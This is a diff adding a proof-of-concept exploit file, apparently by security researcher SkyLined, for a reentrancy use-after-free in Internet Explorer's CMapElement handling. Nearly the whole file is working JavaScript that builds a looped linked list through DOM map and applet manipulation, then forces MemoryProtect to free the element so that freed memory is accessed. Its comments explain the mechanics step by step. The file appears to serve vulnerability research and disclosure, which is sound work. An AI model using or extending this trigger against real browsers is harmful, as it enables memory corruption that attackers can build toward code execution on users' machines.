@@ -1,0 +1,99 @@
+<?xml version="1.0"?>
+<!DOCTYPE x PUBLIC "x" "x">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <script type="text/javascript">
+    <![CDATA[
+      // This PoC attempts to exploit a renetrancy issue in Microsoft Internet
+      // Explorer to trigger a use-after-free.
+      // See http://blog.skylined.nl/20161114001.html for details.
+      var oDocElem = document.documentElement;
+      var oContainer, oMap1, oMap2, uEventCounter = 0;
+      // A C CMarkup object can have a pointer to a C CDoc object. This C
+      // CDoc object has a singly linked list of CMapElements added to the
+      // DOM, starting at offset 8 (See MSHTML!CMarkup::GetMapHead) of the CDoc
+      // and continuing through offset 38 of the CMapElement.
+      // CDoc[8] -> CMapElement[38]#1 -> CMapElement[38]#2 -> etc... -> NULL
+      // When CMapElement::Notify is called to add a Map element to the DOM,
+      // code 0x17, the CMapElement is inserted at the start of this list.
+      // When CMapElement::Notify is called to remove a Map element from the
+      // DOM, code 0x18, the linked list is followed to find the CMapElement and
+      // remove if from the list when found.
+      // When CMapElement::Notify is called twice to add the same element to the
+      // DOM, a loop is created, rather than the CMapElement ending up in the
+      // list twice.
+      // When CMapElement::Notify is called twice to remove the same element
+      // from the DOM, nothing happens the second time.
+      function onReadyStateChangeCallback(){
+        var uEventId = ++uEventCounter;
+        if (uEventId == 1) {
+          // Create a "container" DOM element with three children:
+          // map, applet, map.
+          oContainer = document.createElement("oContainer");
+          oMap1 = oContainer.appendChild(document.createElement("map"));
+          oContainer.appendChild(document.createElement("applet"));
+          oMap2 = oContainer.appendChild(document.createElement("map"));
+          // Add the container DOM element to the DOM document. While adding the
+          // applet DOM object to the DOM document a new C "CObjectElement" is
+          // created and added to the C CMarkup (which is roughly the equivalent
+          // of a DOM DocumentFragment AFAICT). This triggers a new
+          // readystatechange event that interrupts the current one.
+          oDocElem.appendChild(oContainer);
+          // The interrupting readystatechange event is fired after the oMap2
+          // C CMapElement::Notify method has been call to notify that the
+          // object is being removed from one DocumentFragement, but before it
+          // is notified that it is being added to another.
+          // List#1 -> CMapElement#1 -> NULL
+        } else if (uEventId == 2) {
+          oContainer.removeNode(true);
+          // Removing the container from the document causes another round of
+          // calls to ::Notify for remove and add. The last call to oMap2 was
+          // to inform it that it was removed from a C CMarkup. It is now
+          // getting another such call. This is unexpected, but the code does
+          // not detect it. Next, it is added to a new list.
+          // List#2 -> NULL
+          // List#2 -> CMapElement#2 -> CMapElement#1 -> NULL
+        }
+        if (uEventId == 1) {
+          // Now, the delayed C CMapElement::Notify method to add the object
+          // to the DOM is called. The CMapElement is added to the same list
+          // again, causing a loop.
+          // List#2 -> CMapElement#2 -> CMapElement#2 -> loop.
+          // Finally, we remove the CMapElement from the DOM and destroy all
+          // references we have to it. This causes another round of calls to
+          // ::Notify for remove and add, only the remove is important, as
+          // it fails to remove the CMapElement from the list because it
+          // contains a loop.
+          oMap2.removeNode();
+          oMap2 = null;
+          // List#2 -> CMapElement#2 -> CMapElement#2 -> loop.
+          // As far as MSIE is concerned, all references to oMap2 have now been
+          // destroyed, and the element is allowed to get freed. We need to
+          // trick the new MemoryProtect code into actually releasing it. For
+          // this, we need to interrupt JavaScript execution first, which is
+          // done by setting a timeout.
+          setTimeout(function () {
+            // Now the MemoryProtect code will allow the CMapElement to be
+            // freed. However, it only does so when enough memory has been
+            // scheduled to be freed (100000 bytes). This can easily be forced
+            // by creating and discarding a bunch of element. The video element
+            // causes MSIE to allocate 0x190 bytes of memory.
+            var uElementsCount = Math.ceil(100000 / 0x190);
+            for (var i = 0; i < uElementsCount; i++) {
+              document.createElement("video");
+              CollectGarbage();
+            }
+            // Now the CMapElement is finally freed.
+            // The list originally contained a reference to CMapElement#1.
+            // When the code tries to remove this, it will follow the linked
+            // list and access the freed CMapElement#2 memory.
+            oMap1.removeNode();
+            alert("FAIL");
+          }, 0);
+        }
+      }
+      document.addEventListener("readystatechange", onReadyStateChangeCallback, false);
+      // This work by SkyLined is licensed under a Creative Commons
+      // Attribution-Non-Commercial 4.0 International License. 
+    ]]>
+  </script>
+</html>
